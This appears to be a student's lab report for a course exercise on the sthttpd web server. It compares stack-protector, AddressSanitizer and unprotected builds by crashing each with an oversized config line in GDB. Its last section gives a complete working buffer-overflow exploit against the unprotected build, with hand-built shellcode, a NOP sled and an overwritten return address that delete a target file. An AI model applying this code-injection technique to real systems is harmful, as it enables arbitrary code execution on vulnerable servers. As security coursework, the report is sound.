@@ -1,0 +1,378 @@
+1. Checking GDB 
+
+First, I checked that I am using the right path with which gcc, and it gives 
+me /usr/local/cs/bin/gcc, so it is the correct path.
+
+
+2. Building shttpd with patch
+
+I download shttpd 2.27.0 and untared the file on my computer. I then copy it 
+over to the linux server with the following command:
+scp -r ~/Downloads/sthttpd-2.27.0 meganh@lnxsrv09.seas.ucla.edu:~ 
+
+I then log onto the linux server and open the thttpd.h file with emacs to alter
+it and add the patch. 
+cd sthttpd-2.27.0
+emacs src/thttpd.c
+
+Then I alter libhttpd.c file.
+emacs src/libhttpd.c
+
+I use the given shell command the build sthttpd with the patch applied.
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+I use the three compiler options, along with make clean each time.
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+
+3. Running on GDB
+
+I run each of the modified sthttpd daemons under GDB on port 12358 for SP, 
+12359 for AS, and 12360 for NO.
+gdb src/thttpd-sp 
+(gdb) run -p 12358 -D
+
+gdb src/thttpd-as
+(gdb) run -p 12359 -D
+
+gdb src/thttpd-no
+(gdb) run -p 12360 -D
+
+
+4. Verifying normal case
+
+Then I opened a new terminal to verify that web servers work in the normal case.
+cd sthttpd-2.27.0
+curl http://localhost:12358/test.txt
+curl http://localhost:12359/test.txt
+curl http://localhost:12360/test.txt
+
+The outputs were “test test test” for all three of them, so the web servers work.
+
+
+5. Making SP crash
+
+To make SP crash, I created a config file by running the following command and 
+creating a -C config.txt file
+src/thttpd-sp -port
+emacs config.txt
+
+In my config.txt file, I put the following code to make the program crash due 
+to a large string.
+logfile="000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000
+0001"
+
+I run the following command in gdb and backtrace to examine the code and 
+identify the location of the crashes.
+gdb src/thttpd-sp
+(gdb) run -p 12358 -D -C config.txt
+
+I receive the following error:
+*** stack smashing detected ***: /w/home.15/eng/ugrad/meganh/sthttpd-2.27.0/src/thttpd-sp terminated
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+
+By backtracing the code, I can identify the crash and add a breakpoint.
+#0  0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db0019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e5376 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff764df64 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404edd in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x3030303030303030 in ?? ()
+#8  0x3030303030303030 in ?? ()
+#9  0x3030303030303030 in ?? ()
+#10 0x3030303030303030 in ?? ()
+#11 0x3030303030303030 in ?? ()
+#12 0x3030303030303030 in ?? ()
+#13 0x3030303030303030 in ?? ()
+#14 0x3030303030303030 in ?? ()
+#15 0x3030303030303030 in ?? ()
+#16 0x3030303030303030 in ?? ()
+#17 0x3030303030303030 in ?? ()
+#18 0x3030303030303030 in ?? ()
+#19 0x3030303030303030 in ?? ()
+#20 0x3030303030303030 in ?? ()
+#21 0x3030303030303030 in ?? ()
+
+I find that the code breaks at the following line.
+(gdb) b thttpd.c:1190
+(gdb) set disassemble-next-line on
+(gdb) run -p 12358 -D -C config.txt
+(gdb) si (repeat to find where the code is crashing)
+
+The program crashes at the following location because %rcx has been 
+overwritten and is treated as a memory location. It now contains 
+0x3030303030303030 since the config.txt file is too long. 
+0x00007ffff6daf118:	80 39 48	cmpb   $0x48,(%rcx)
+
+To analyze the value stored in %rcx, I use the following command and 
+receive the output that reveals that rcx was overwritten.
+info registers $rcx
+rcx            0x3030303030303030	3472328296227680304
+
+Because of the optimization -fstack-protector-strong, the program has a 
+canary that checks to see if the stack has been altered by assessing 
+the canary value. Since the canary value has been changed, the code crashes.
+
+6. Making AS crash:
+
+To identify the error in thttpd-as, I run it in gdb and backtrace it similarly.
+gdb src/thttpd-as
+(gdb) run -p 12359 -D -C config.txt
+
+I receive the following error:
+==30354==ERROR: AddressSanitizer: stack-buffer-overflow on address 
+0x7fffffffcd14 at pc 0x000000441de4 bp 0x7fffffffcc70 sp 0x7fffffffc420
+READ of size 607 at 0x7fffffffcd14 thread T0
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+
+I backtrace the code and find that the program’s sanitizer is crashing, 
+so I use set disassemble-next-line on to analyze the machine language of the coed.
+#0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+    this=0x7fffffffaf20, pc=4464100, max_depth=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123
+#3  0x0000000000419d7f in __asan::GetStackTraceWithPcBpAndContext (fast=false, 
+    context=0x0, bp=140737488342128, pc=4464100, max_depth=256, 
+    stack=0x7fffffffaf20)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50
+#4  __asan::ErrorGeneric::Print (
+    this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482
+#5  0x00000000004ccae8 in __asan::ErrorDescription::Print (
+    this=0x980140 <__asan::ScopedInErrorReport::current_error_>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360
+#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb797, 
+    __in_chrg=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167
+#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342128, 
+    sp=sp@entry=140737488340000, addr=addr@entry=140737488342292, 
+    is_write=is_write@entry=false, access_size=access_size@entry=607, exp=0, 
+    fatal=false) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397
+
+When I run the program with set dissemble-next-line on, I find that the 
+machine instruction causing the crash is the following:
+0x00007ffff7073118:	80 39 48	cmpb   $0x48,(%rcx)
+
+The program aborts because of the overflow due to the address sanitizer.
+Similarly, %rcx has been overwritten and is now treated as a memory 
+location because the contents of the config.txt file overflow the stack. 
+
+
+7. Making NO crash
+
+I run the program with the following command lines
+gdb src/thttpd-no
+(gdb) run -p 12360 -D -C config.txt
+
+And I receive the following error:
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+
+When I backtrace the program, I see that it is crashing in line 1190
+#0  0x0000000000404c8c in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x3030303030303030 in ?? ()
+#2  0x3030303030303030 in ?? ()
+#3  0x3030303030303030 in ?? ()
+#4  0x3030303030303030 in ?? ()
+#5  0x3030303030303030 in ?? ()
+#6  0x3030303030303030 in ?? ()
+#7  0x3030303030303030 in ?? ()
+#8  0x3030303030303030 in ?? ()
+#9  0x3030303030303030 in ?? ()
+#10 0x3030303030303030 in ?? ()
+#11 0x3030303030303030 in ?? ()
+#12 0x3030303030303030 in ?? ()
+#13 0x3030303030303030 in ?? ()
+#14 0x3030303030303030 in ?? ()
+#15 0x3030303030303030 in ?? ()
+#16 0x3030303030303030 in ?? ()
+#17 0x3030303030303030 in ?? ()
+#18 0x3030303030303030 in ?? ()
+#19 0x3030303030303030 in ?? ()
+#20 0x3030303030303030 in ?? ()
+#21 0x3030303030303030 in ?? ()
+
+I set a breakpoint at 1190 and use set disassemble-next-line on to 
+analyze what is making the program crash.
+(gdb) b thttpd.c:1190
+(gdb) set disassemble-next-line on
+(gdb) run -p 12360 -D -C config.txt
+(gdb) si (repeat to find where the code is crashing)
+
+I find that the final code run is the following because there is no 
+buffer overflow check for this setting.
+0x0000000000404c8c <read_config+1116>:	c3	retq 
+
+The -zexecstack option allows us to execute anything on the stack, 
+but since the program crashed with SIGSEGV, it attempted to execute 
+something that is beyond the scope of the stack.
+
+
+8. Generate assembly language code
+
+I generate the assembly codes with the following commands in the src directory
+make clean
+gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+
+make clean
+gcc -S -O2 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
+
+make clean
+gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s
+
+After I viewed the handle_read function in the assembly language, 
+I found that the two functions are the same for SP and NO. Even 
+though SP has more checks for canaries, it does not require more 
+lines of code in handle_read. There are a lot more lines of code 
+for the handle_read in AS. The AS assembly code utilizes a lot 
+of the following functions
+call	__asan_report_load
+call	__asan_report_store
+with a number (4 or 8) attached to the end in order check for shadow 
+memories around the buffer to verify if the memory locations have a 
+shadow. This constant checking doubles the number of lines of assembly 
+language code and helps the program return an error when there are 
+shadowed areas around the buffer.
+
+
+9. Exploit for bug in NO
+
+I need to find the size of the buffer to overwrite the return address 
+by locating the starting address of the buffer and the return address. 
+To find the address of the buffer, I set a breakpoint at the beginning 
+of read_config and print out the address of “line” 
+gdb src/thttpd-no
+(gdb) b read_config
+(gdb) run -p 12560 -D -C test.txt 
+(gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffce30
+
+Similarly, I use the following commands to find the address of %rsp
+(gdb) info registers rsp
+rsp            0x7fffffffcec8	0x7fffffffcec8
+
+The size of the buffer is the difference between the two, which is 
+0x7fffffffcec8 - 0x7fffffffce30 = 152 bytes.
+
+I then create an exploit.txt file and a target.txt file
+emacs exploit.txt
+touch target.txt
+
+I fill the exploit.txt file with 152 random bytes, starting with 
+port= for correct syntax. “port =“ in hexadecimal is the following 
+(via online convertor)
+70 6f 72 74 3d 
+
+We have to convert “target.txt” to hexadecimal in order to store 
+its readable hexadecimal value into %rdi to pass into the unlink 
+function. I used an online text to hexadecimal converter to find 
+this value and add 00 to the end for the null byte 
+74 61 72 67 65 74 2e 74 78 74 00 
+
+I create an assembly file t.s containing the assembly language 
+needed to move target.txt into %rdi and use the unlink system 
+call to remove it
+The address of target.txt is given by the following
+0x7fffffffcec8 - 0x0B = $0x7fffffffcebd
+movq $0x7fffffffcebd, %rdi
+movl $0x57, %eax
+syscall
+
+And I generate an object file to find byte pattern associated with 
+this function with the following commands
+gcc -c t.s
+objdump -d t.o
+
+The object code I received is the following
+t.o:     file format elf64-x86-64
+Disassembly of section .text:
+0000000000000000 <.text>:
+   0:	48 bf bd ce ff ff ff 	movabs $0x7fffffffcebd,%rdi
+   7:	7f 00 00 
+   a:	b8 57 00 00 00       	mov    $0x57,%eax
+   f:	0f 05                	syscall 
+
+The address of the unlink instruction is the start of the line - 28 
+(11 bytes for target.txt + 7 for syscall + 10 for mov to rdi) to 
+account for the length of the exploit code and 2 more bytes so the 
+function will jump to before our exploit code
+0x7fffffffcec8 - 28 - 2 = 7fffffffceaa
+Little endian: aa ce ff ff ff 7f
+
+Format for exploit.txt:
+mov address into rdi: 48 bf bd ce ff ff ff 7f 00 00 
+mov $0x57 into eax for sys call: b8 57 00 00 00 0f 05
+hex representation of target.txt: 74 61 72 67 65 74 2e 74 78 74 00
+overwritten return address: aa ce ff ff ff 7f 00 00 
+
+Therefore, my exploit.txt file will contain the following in 
+hexadecimal, since the total has to be 152 bytes, there are 
+filler 90’s for the NOP sled
+70 6f 72 74 3d 90 90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 48 bf bd ce ff ff ff 7f 00 00 
+b8 57 00 00 00 0f 05 74 61 72 67 65 74 2e 74 78 
+74 00 aa ce ff ff ff 7f 00 00 
+
+I converted these hexadecimal values into ASCII and stored it 
+into exploit.txt with the following commands
+python
+buf = ""
+buf += ("port=" + (("\x90") * 119) + ("\x48" + "\xbf" + 
+"\xbd" + "\xce" + "\xff" +  "\xff" + "\xff" + "\x7f" + 
+"\x00" + "\x00" + "\xb8" + "\x57" + "\x00" + "\x00" + 
+"\x00" + "\x0f" + "\x05" + "\x74" + "\x61" + "\x72" + 
+"\x67" + "\x65" + "\x74" + "\x2e" + "\x74" + "\x78" + 
+"\x74" + "\x00" + "\xaa" + "\xce" + "\xff" + "\xff" + 
+"\xff" + "\x7f" + "\x00" + "\x00"))
+f = open('exploit.txt', 'w') 
+f.write(buf)
+f.close()
+quit()
+
+I have included my exploit.txt file to explain my exploit.
+
+To run thttpd-no with my exploit file to delete target.txt, 
+I use the following commands
+cd src
+./thttpd-no -p 12560 -D -C exploit.txt
+
+I receive the following message
+Program received signal SIGSEGV, Segmentation fault.
+   0x00007fffffffceaa in ?? ()
+
+Then I check if target.txt is removed with the command
+ls target.txt
+ls: cannot access ‘target.txt’: No such file or directory
+
+Target.txt has been deleted so the exploit succeeded. 
